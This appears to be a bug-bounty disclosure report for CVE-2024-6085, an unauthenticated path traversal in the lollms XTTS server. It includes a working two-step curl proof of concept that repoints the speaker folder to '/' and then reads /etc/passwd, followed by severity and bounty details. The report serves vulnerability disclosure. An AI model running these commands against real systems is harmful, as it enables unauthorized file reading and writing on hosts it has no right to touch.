@@ -1,0 +1,36 @@
+Title: Path traversal due to unauthenticated root folder settings change in parisneo/lollms
+
+Proof of Concept: 
+First change the speaker folder
+
+curl -X POST -H "Content-Type: application/json" -d '{"speaker_folder": "/"}' http://localhost:8020/set_speaker_folder
+
+then open any file
+
+curl http://localhost:8020/sample/etc/passwd
+
+To write arbitrary audio files, you can change the output folder in a similar way.
+
+Note: If the exploit does not work, it may be necessary to install and start the XTTS system using /install_xtts and /start_xtts endpoins, which should launch the server on port 8020. On my system, I also had to patch the python executable path in ./lollms-webui/scripts/linux/lollms-webui/lollms_core/lollms/utilities.py to python_path = Path(sys.executable).parent.parent.parent/"miniconda3"/"envs"/env_name/"bin"/"python" to make the installation succeed.
+
+Impact: 
+This vulnerability can be abused to write audio files compatible with XTTS to arbitrary locations on the system, and also enumerate such file paths on the system. Furthermore, it can be used to read arbitrary files on the system.
+
+CVE ID: CVE-2024-6085
+Status: (published)
+Vulnerability Type: CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')
+Severity: High (8.6)
+Attack Vector: Network
+Attack Complexity: Low
+Privileges Required: None
+User Interaction: None
+Scope: Unchanged
+Confidentiality: High
+Integrity: Low
+Availability: Low
+Registry: Other
+Affected Version: v9.6
+Visibility: Public
+Status: Awaiting fix
+Disclosure Bounty: $450
+Fix Bounty: $112.5
